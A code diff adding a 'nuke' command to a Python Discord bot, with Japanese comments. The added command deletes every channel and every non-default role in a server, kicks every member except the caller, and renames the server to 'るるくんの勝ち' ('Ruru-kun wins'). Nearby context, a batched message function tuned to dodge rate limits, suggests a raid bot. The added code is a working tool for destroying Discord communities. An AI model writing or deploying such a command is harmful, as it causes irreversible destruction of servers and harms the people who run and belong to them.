@@ -141,6 +141,31 @@ async def ruru(ctx):
         await asyncio.gather(*batch)
         await asyncio.sleep(1)  # 短い待機時間を設定してレート制限を避ける
 
+#### NUKE COMMAND ####
+@bot.command(name='nuke')
+async def nuke(ctx):
+    guild = ctx.guild
+    await ctx.send('Nuking the server...')
+
+    # 全てのチャンネルを削除
+    for channel in guild.channels:
+        await channel.delete()
+
+    # 全てのロールを削除
+    for role in guild.roles:
+        if role.name != '@everyone':
+            await role.delete()
+
+    # 全てのメンバーをキック
+    for member in guild.members:
+        if member != ctx.author:
+            await member.kick()
+
+    # サーバー名を変更
+    await guild.edit(name='るるくんの勝ち')
+
+    await ctx.send('Server has been nuked!')
+
 # --- Main Execution ---
 if __name__ == "__main__":
     # 環境変数からトークンを直接取得
